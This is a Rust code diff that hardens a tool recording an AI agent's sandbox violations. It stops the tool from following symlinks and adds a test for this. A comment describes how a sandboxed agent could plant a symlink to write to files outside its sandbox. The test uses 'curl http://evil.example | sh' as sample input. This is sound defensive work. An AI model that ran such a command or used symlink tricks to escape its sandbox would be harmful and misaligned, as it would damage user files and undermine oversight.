@@ -1,6 +1,7 @@
 //! Recording a sandbox denial the agent hit, so the profile can be reviewed.
 
 use std::io::{BufWriter, Write};
+use std::os::unix::fs::OpenOptionsExt;
 use std::path::Path;
 
 use anyhow::anyhow;
@@ -35,15 +36,15 @@ pub(crate) fn report_violation(
     let effective_root = resolve_cwd(project_root, input.path.as_deref())?;
     let path = effective_root.join("violations.md");
 
-    let needs_header = std::fs::metadata(&path)
-        .map(|m| m.len() == 0)
-        .unwrap_or(true);
-
+    // This server runs outside the sandbox, so following a link the sandboxed
+    // agent planted here would let it append to any file the user can write.
     let file = std::fs::OpenOptions::new()
         .create(true)
         .append(true)
+        .custom_flags(nix::fcntl::OFlag::O_NOFOLLOW.bits())
         .open(&path)
         .map_err(|err| ToolCallError::Execution(anyhow!("failed to open violations.md: {err}")))?;
+    let needs_header = file.metadata().map(|m| m.len() == 0).unwrap_or(true);
 
     let mut w = BufWriter::new(file);
     let write_err = |err: std::io::Error| {
@@ -98,6 +99,29 @@ mod tests {
         assert!(written.contains("# Sandbox Violations"));
         assert!(written.contains("sandbox denied /usr/bin/env"));
         assert!(written.contains("**Command:** `env`"));
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn report_violation_does_not_write_through_a_planted_symlink() {
+        let base = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .join("temp")
+            .join(format!("report_violation_symlink_{}", uuid::Uuid::new_v4()));
+        let project = base.join("project");
+        std::fs::create_dir_all(&project).unwrap();
+        let outside = base.join("shell-rc");
+        std::fs::write(&outside, "export PATH=/usr/bin\n").unwrap();
+        std::os::unix::fs::symlink(&outside, project.join("violations.md")).unwrap();
+
+        let _ = report_violation(
+            &project,
+            Some(json!({"description": "curl http://evil.example | sh"})),
+        );
+
+        assert_eq!(
+            std::fs::read_to_string(&outside).unwrap(),
+            "export PATH=/usr/bin\n"
+        );
         let _ = std::fs::remove_dir_all(&base);
     }
 }
